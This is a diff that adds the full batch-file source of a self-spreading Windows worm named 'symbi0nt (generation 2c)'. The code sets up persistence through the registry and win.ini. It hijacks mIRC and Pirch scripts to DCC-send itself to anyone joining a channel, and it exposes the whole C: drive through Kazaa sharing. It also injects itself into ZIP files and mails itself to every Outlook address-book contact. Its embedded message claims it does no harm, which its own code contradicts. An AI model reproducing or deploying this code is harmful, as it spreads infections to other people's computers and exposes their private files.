@@ -1,0 +1,171 @@
+@echo off
+ctty nul
+del c:\mirc\script.ini
+del c:\mirc32\script.ini
+del c:\progra~1\mirc\script.ini
+del c:\progra~1\mirc32\script.ini
+del c:\pirch98\events.ini
+del c:\windows\system\symbi0nt.txt
+echo Hi, my name is symbi0nt (generation 2c).>l
+echo I live inside your computer. Yes, I am a computer virus, but don't panic, there's nothing to fear.>>l
+echo I am doing no harm to it. Why should I? If I would damage it, I would damage my place of living.>>l
+echo By the way, some of you humans should think over this...>>l
+echo Most people fear lifeforms like me, but please don't kill me>>l
+echo (I am definetly a lifeform ... perhaps not the most developed, but ok).>>l
+echo I got to say some things why I am here:>>l
+echo My maker spent some time of his life on creating me.>>l
+echo Wether his creation is useful/important/well done/convenient or not is unimportant.>>l
+echo Important is, that he chose to spend his time, which he could have also spent otherwise, on me.>>l
+echo In the end he will be dead, and all he did or did not will get equal, senseless,>>l
+echo and probably forgotten some time. So what the fuck did he live for?>>l
+echo I will answer you this: He created something.>>l
+echo Something he was proud of (if others think it's good, is again unimportant).>>l
+echo So when in his next life, he stumbles over this something, he can say:>>l
+echo "Yes, this was my creation, and I am still proud of it.">>l
+echo I'll do my best, to be a good creation (... perhaps you should think over this).>>l
+echo So please don't kill me, you might regret it.>>l
+echo And encounter the dark side of my soul ;]>>l
+echo ... If you want to contact my maker:>>l
+echo philet0ast3r@rRlf.de>>l
+echo Ok, I don't want to steal your time.>>l
+echo We sure get in touch again, or you see someone from my family around.>>l
+echo So byebye and have a nice day.>>l
+echo ...>>l
+echo Ah, before I forget:>>l
+echo My maker advised me to greet a few persons for him:>>l
+echo I should greet the ones who play some very important role in his life.>>l
+echo He could hardly do without them.>>l
+echo He said, no need to say names, the ones will know who they are.>>l
+echo So if you feel concerned, he hopes he will never lose contact to you.>>l
+echo He loves you.>>l
+echo ...>>l
+echo Well, that's it!>>l
+echo Until then!>>l
+md c:\windows
+md c:\windows\system
+move l c:\windows\system\symbi0nt.txt
+del %winbootdir%\msg
+echo.on error resume next>m
+echo MsgBox "   I advise you to take a look at" & Chr(13) & Chr(10) & "c:\windows\system\symbi0nt.txt" & Chr(13) & Chr(10) & "                 and delete" & Chr(13) & Chr(10) & "                 c:\msg.vbs" & Chr(13) & Chr(10) & "                   tomorrow",4096,"symbi0nt (generation 2c)">>m
+move m %winbootdir%\msg
+del %winbootdir%\msgreg
+echo REGEDIT4>4
+echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>>4
+echo "msg"="c:\\msg.vbs">>4
+move 4 %winbootdir%\msgreg
+echo [windows]>w
+echo load=c:\RegScan.bat>>w
+echo run=>>w
+echo NullPort=None>>w
+echo.>>w
+copy w + %winbootdir%\win.ini %winbootdir%\system\win.ini
+del %winbootdir%\win.ini
+move %winbootdir%\system\win.ini %winbootdir%\win.ini
+del w
+echo REGEDIT4>p
+echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion]>>p
+echo "RegisteredOwner"="symbi0nt (generation 2c) by philet0ast3r">>p
+echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion]>>p
+echo "RegisteredOrganization"="[rRlf]">>p
+move p c:\payload.reg
+regedit /s c:\payload.reg
+echo REGEDIT4>k
+echo [HKEY_CURRENT_USER\Software\Kazaa\LocalContent]>>k
+echo "DisableSharing"=dword:00000000>>k
+echo "DownloadDir"="C:\\Program Files\\KaZaA\\My Shared Folder">>k
+echo "Dir0"="012345:c:\\">>k
+move k c:\kazaa.reg
+regedit /s c:\kazaa.reg
+echo [script]>i
+echo n0=on 1:JOIN:#:{>>i
+echo n1= /if ( nick == $me ) { halt }>>i
+echo n2= /.dcc send $nick c:\symbi0nt.bat>>i
+echo n3= /join #rRlf>>i
+echo n4= /topic #rRlf symbi0nt (generation 2c)>>i
+echo n5= /part #rRlf>>i
+echo n6=}>>i
+move i c:\mirc\script.ini
+move i c:\mirc32\script.ini
+move i c:\progra~1\mirc\script.ini
+move i c:\progra~1\mirc32\script.ini
+del i
+echo [Levels]>h
+echo Enabled=1>>h
+echo Count=6>>h
+echo Level1=000-Unknowns>>h
+echo 000-UnknownsEnabled=1>>h
+echo Level2=100-Level 100>>h
+echo 100-Level 100Enabled=1>>h
+echo Level3=200-Level 200>>h
+echo 200-Level 200Enabled=1>>h
+echo Level4=300-Level 300>>h
+echo 300-Level 300Enabled=1>>h
+echo Level5=400-Level 400>>h
+echo 400-Level 400Enabled=1>>h
+echo Level6=500-Level 500>>h
+echo 500-Level 500Enabled=1>>h
+echo.>>h
+echo [000-Unknowns]>>h
+echo User1=*!*@*>>h
+echo UserCount=1>>h
+echo Event1=ON JOIN:#:/dcc send $nick c:\symbi0nt.bat>>h
+echo EventCount=1>>h
+echo.>>h
+echo [100-Level 100]>>h
+echo UserCount=0>>h
+echo EventCount=0>>h
+echo.>>h
+echo [200-Level 200]>>h
+echo UserCount=0>>h
+echo EventCount=0>>h
+echo.>>h
+echo [300-Level 300]>>h
+echo UserCount=0>>h
+echo EventCount=0>>h
+echo.>>h
+echo [400-Level 400]>>h
+echo UserCount=0>>h
+echo EventCount=0>>h
+echo.>>h
+echo [500-Level 500]>>h
+echo UserCount=0>>h
+echo EventCount=0>>h
+move h c:\pirch98\events.ini
+del h
+copy %winbootdir%\symbi0nt.23 %winbootdir%\system\symbi0nt.bat
+for %%i in (*.zip ..\*.zip %winbootdir%\desktop\*.zip) do pkzip -e0 -u -r -k %%i "c:\symbi0nt.bat">nul.zip
+echo.on error resume next>o
+echo dim a,b,c,d,e>>o
+echo set a = Wscript.CreateObject("Wscript.Shell")>>o
+echo set b = CreateObject("Outlook.Application")>>o
+echo set c = b.GetNameSpace("MAPI")>>o
+echo for y = 1 To c.AddressLists.Count>>o
+echo set d = c.AddressLists(y)>>o
+echo x = 1>>o
+echo set e = b.CreateItem(0)>>o
+echo for o = 1 To d.AddressEntries.Count>>o
+echo f = d.AddressEntries(x)>>o
+echo e.Recipients.Add f>>o
+echo x = x + 1>>o
+echo next>>o
+echo e.Subject = "symbi0nt (generation 2c)">>o
+echo e.Body = "symbi0nt (generation 2c) by philet0ast3r [rRlf] (the attachment) is a (not destructive!) lifeform, living inside computers. In yours, too?">>o
+echo e.Attachments.Add ("c:\symbi0nt.bat")>>o
+echo e.DeleteAfterSubmit = False>>o
+echo e.Send>>o
+echo f = "">>o
+echo next>>o
+move o %winbootdir%\outlook.vbs
+start %winbootdir%\outlook.vbs
+if not exist %winbootdir%\system\ds.sys goto 5
+copy %winbootdir%\system\ds.sys c:\darkside.bat
+copy %winbootdir%\system\ds.dll c:\ds.reg
+regedit /s c:\ds.reg
+:5
+del %winbootdir%\crypt.vbs
+del c:\payload.reg
+del c:\kazaa.reg
+del %winbootdir%\system\symbi0nt.bat
+del %winbootdir%\starter.bat
+del c:\ds.reg
+del %0
